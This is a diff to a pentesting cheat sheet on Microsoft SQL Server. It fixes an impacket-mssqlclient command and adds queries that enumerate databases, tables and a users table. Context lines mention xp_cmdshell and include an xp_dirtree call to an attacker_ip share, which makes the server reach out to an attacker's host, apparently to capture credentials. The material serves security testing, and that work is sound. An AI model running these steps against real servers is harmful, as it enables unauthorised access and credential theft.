@@ -10,13 +10,20 @@ Be careful, you can **block accounts** if you fail login several times using an 
 [[Impacket-Cheatsheet]]; if you have credentials:
 ```bash
 # connect to a Microsoft SQL server
-imapcket-mssqlclient -port $PORT $domain/$sql_svc 
+impacket-mssqlclient -port $PORT $domain/$sql_svc 
 ```
 
 ```sql
 SELECT @@version					 	-- version check
 SELECT DB_NAME()						-- current database
 SELECT name FROM master..sysdatabases;	-- list databases
+
+SELECT name, database_id, create_date FROM sys.databases;
+
+USE <databasenamegoeshere>
+SELECT * FROM information_schema.tables;
+SELECT * FROM users;
+
 -- Has two comment types
 SELECT 1 — comment  
 SELECT /*comment*/ 
@@ -24,6 +31,22 @@ SELECT /*comment*/
 SELECT is_srvrolemember('sysadmin'); 	-- role check
 
 ```
+
+Show all the tables in a database
+```sql
+SELECT table_name, table_schema, table_type
+    FROM information_schema.tables
+    WHERE table_catalog = 'TestDB'
+    ORDER BY table_name ASC;
+```
+
+Show all tables across all databases
+```sql
+SELECT *
+    FROM information_schema.tables
+    ORDER BY table_name ASC;
+```
+
 
 ## Command Execution
 Check if cmdshell is already active
@@ -55,3 +78,4 @@ xp_dirtree "\\attacker_ip\Share"
 
 ## References
 [pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
+[therootcompany](https://therootcompany.com/blog/mssql-cheat-sheet/)
